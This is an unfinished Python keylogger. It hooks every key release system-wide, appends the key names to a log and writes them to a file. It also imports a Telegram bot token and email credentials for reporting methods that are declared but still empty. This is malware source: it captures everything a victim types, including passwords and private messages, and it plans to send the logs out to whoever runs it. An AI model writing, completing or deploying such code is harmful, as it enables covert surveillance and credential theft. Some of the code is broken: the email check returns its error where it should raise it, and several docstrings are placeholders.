import keyboard
from re import fullmatch
from contracts import contract, new_contract

from config import SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, EMAIL, EMAIL_PASSWORD


@new_contract
def validationCheckReportMethod(x):
    if x not in ("email", "file", "telegram"):
        raise ValueError("report_method can only be one of these three:"
                         "email, telegram, file. Unacceptable %s" % x)


@new_contract
def validationCheckEmail(x):  # TODO: replace re with py3-validate-email
    if not fullmatch(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', x):
        return ValueError("Invalid email")


class Keylogger:
    @contract
    def __init__(self, interval=3600, report_method="file"):
        """
        :param interval: time interval between reports (in seconds)
        :param report_method: where to send report

        :type interval: int,>0
        :type report_method: str,validationCheckReportMethod
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""

    def callback(self, event):
        """
        This method is called when any key is pressed.
        It tracks the key pressed and writes it to log.
        """
        name = event.name
        if len(name) > 1:
            pass
        self.log += name

    @contract
    def report_to_email(self, email, password, message):
        """
        This method sends reports to the specified email.

        :param email: the name of the email where the logs will be sent
        :param password: password from email
        :param message: log message template

        :type email: str,validationCheckEmail
        :type password: str
        :type message: str
        """

    def report_to_file(self):
        """
        This method ...
        """
        with open("text.txt", "w") as file:
            print(self.log, file=file)

    def report_to_telegram(self):
        """
        This method ...
        """
        pass

    def dispatcher(self):
        pass

    def start(self):
        """
        This method ...
        """
        keyboard.on_release(callback=self.callback)
        keyboard.wait()


def main():
    """
    """
    keylogger = Keylogger(SEND_REPORT_EVERY, "email")
    keylogger.start()


if __name__ == "__main__":
    main()
